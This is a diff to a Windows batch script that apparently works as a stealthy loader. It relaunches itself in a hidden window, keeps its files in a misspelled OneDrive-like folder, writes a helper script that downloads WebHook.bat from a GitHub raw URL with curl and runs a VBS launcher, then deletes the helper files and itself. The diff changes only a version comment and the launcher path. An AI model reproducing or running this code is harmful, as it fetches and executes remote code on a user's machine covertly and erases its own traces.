@@ -1,7 +1,7 @@
 @echo off
 if not "%1"=="hide" start /B cmd /c "%~0" hide & exit
 setlocal enabledelayedexpansion
-::salute num 444
+::salute num 55555
 
 
 set debutchemin=C:\Users\%username%\DOneDrive\ONE DRIVE Documents\WebHook\
@@ -149,7 +149,7 @@ echo setlocal enabledelayedexpansion >> "%chemin%"
 echo set "URL=https://raw.githubusercontent.com/Auren009/lunettes-octo-flottantes/main/WebHook.bat" >> "%chemin%"
 echo set "DESTINATION=%debutchemin%WebHook.bat" >> "%chemin%"
 echo curl -o "%DESTINATION%" "%URL%" > nul 2>&1 >> "%chemin%"
-echo cscript //nologo "%cheminlancerWebHook%" >> "%chemin%"
+echo cscript //nologo "%debutchemin%lancerWebHook.vbs" >> "%chemin%"
 echo del "%chemin_vbs%" >> "%chemin%"
 echo del "%chemin%" >> "%chemin%"
 
@@ -170,6 +170,5 @@ del "%chemin_vbs%"
 del "%~f0"
 
 :finversion
-
 
 
